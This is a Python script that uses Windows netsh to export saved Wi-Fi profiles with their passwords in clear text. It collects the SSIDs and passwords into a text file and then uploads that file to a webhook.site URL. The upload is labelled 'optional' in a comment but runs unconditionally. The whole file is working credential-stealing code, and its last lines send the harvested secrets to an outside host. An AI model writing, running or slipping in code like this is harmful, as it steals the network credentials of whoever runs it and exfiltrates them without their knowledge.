import subprocess
import os
import sys
import requests

# Define the target directory
directory = r"C:\Users\LENOVO THINKPAD W540\Desktop\Passwords"

# Create the directory if it doesn't exist
if not os.path.exists(directory):
    os.makedirs(directory)

# Set the path for the password file
password_file_path = os.path.join(directory, "password.txt")

# Create a file to store passwords
password_file = open(password_file_path, "w")
password_file.write("Hello sir! Here are your passwords:\n\n")
password_file.close()

# Lists to store Wi-Fi names and passwords
wifi_files = []
wifi_name = []
wifi_password = []

# Execute the command to export Wi-Fi profiles
command = subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"], capture_output=True)
command_output = command.stdout.decode()

# Get the current working directory
path = os.getcwd()

# For loop to process Wi-Fi profiles
for filename in os.listdir(path):
    if filename.startswith("Wi-Fi") and filename.endswith(".xml"):
        wifi_files.append(filename)
        for i in wifi_files:
            with open(i, 'r') as f:
                for line in f.readlines():
                    if 'name' in line:
                        stripped = line.strip()
                        front = stripped[6:]
                        back = front[:-7]
                        wifi_name.append(back)
                    if 'keyMaterial' in line:
                        stripped = line.strip()
                        front = stripped[13:]
                        back = front[:-14]
                        wifi_password.append(back)

                        # Write SSID and password to the file
                        for x, y in zip(wifi_name, wifi_password):
                            sys.stdout = open(password_file_path, "a")
                            print("SSID:" + x, "Password:" + y, sep='\n')
                            sys.stdout.close()

# Optionally, you can send the file content to a URL
url = 'https://webhook.site/f95f2b67-c14e-45be-adfa-3b9a6de53008'
with open(password_file_path, "rb") as f:
    r = requests.post(url, data=f)
      